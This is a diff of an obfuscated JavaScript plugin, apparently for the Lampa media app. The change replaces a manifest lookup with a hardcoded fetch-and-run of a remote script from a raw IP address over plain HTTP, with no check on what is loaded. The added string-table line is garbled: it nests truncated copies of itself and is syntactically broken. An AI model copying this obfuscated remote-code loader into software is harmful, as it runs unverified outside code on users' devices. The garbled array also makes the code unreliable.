@@ -30,29 +30,21 @@
 				clearInterval(_0x32b0fb);
 
 				try {
-					// Проверка наличия Manifest и метода get
-					if (Lampa['Manifest'] && typeof Lampa['Manifest']['get'] === 'function') {
-						var scriptUrl = Lampa['Manifest']['get']('online_script', '');
-						if (scriptUrl) {
-							Lampa['Utils']['putScriptAsync'](scriptUrl, function () {
-								console.log('Скрипт успешно загружен:', scriptUrl);
-							});
-						} else {
-							Lampa['Noty'].show('Ошибка доступа: скрипт не найден');
-						}
-					} else {
-						Lampa['Noty'].show('Ошибка: Manifest или метод get отсутствует');
-					}
+					// Попытка загрузить скрипт напрямую
+					var defaultScriptUrl = 'http://185.87.48.42:2627/online.js'; // Значение по умолчанию
+					Lampa['Utils']['putScriptAsync'](defaultScriptUrl, function () {
+						console.log('Скрипт успешно загружен:', defaultScriptUrl);
+					});
 				} catch (error) {
 					// Обработка ошибок
-					Lampa['Noty'].show('Ошибка доступа: ' + error.message);
+					Lampa['Noty'].show('Ошибка загрузки скрипта: ' + error.message);
 				}
 			}
 		}, 200);
 	}()));
 
 	function _0x1dcc() {
-		var _0x52efb3 = ['toString', '1171128rczVrY', 'set', 'show', '26BQRCLQ', 'Noty', 'Ошибка\x20доступа', 'putScriptAsync', '287892GtpFmK', '1133190oXjfKB', 'bind', 'return\x20(function()\x20', 'search', '6838TszSrx', 'tyusdt', 'undefined', 'constructor', '1881313NcTCco', '__proto__', '5932773CcQUfV', '22112OAYCTg', '(((.+)+)+)+$', 'prototype', '255dZfZnu', 'bylampa', 'origin', 'Utils', 'Storage', 'Manifest', 'get', 'log', 'lampac_unic_id', 'http://185.87.48.42:2627/online.js', 'trace', 'apply'];
+		var _0x52efb3 = ['toString', '1171128rczVrY', 'set', 'show', '26BQRCLQ', 'Noty', 'Ошибка var _0x52efb3 = ['toString', '1171128rczVrY', 'set', 'show', '26BQRCLQ', 'Noty', 'Ошибка\x20доступа', 'putScriptAsync', '287892GtpFmK', '1133190oXjfKB', 'bind', 'return var _0x52efb3 = ['toString', '1171128rczVrY', 'set', 'show', '26BQRCLQ', 'Noty', 'Ошибка\x20доступа', 'putScriptAsync', '287892GtpFmK', '1133190oXjfKB', 'bind', 'return\x20(function() var _0x52efb3 = ['toString', '1171128rczVrY', 'set', 'show', '26BQRCLQ', 'Noty', 'Ошибка\x20доступа', 'putScriptAsync', '287892GtpFmK', '1133190oXjfKB', 'bind', 'return\x20(function()\x20', 'search', '6838TszSrx', 'tyusdt', 'undefined', 'constructor', '1881313NcTCco', '__proto__', '5932773CcQUfV', '22112OAYCTg', '(((.+)+)+)+$', 'prototype', '255dZfZnu', 'bylampa', 'origin', 'Utils', 'Storage', 'Manifest', 'get', 'log', 'lampac_unic_id', 'http://185.87.48.42:2627/online.js', 'trace', 'apply'];
 		_0x1dcc = function () {
 			return _0x52efb3;
 		};
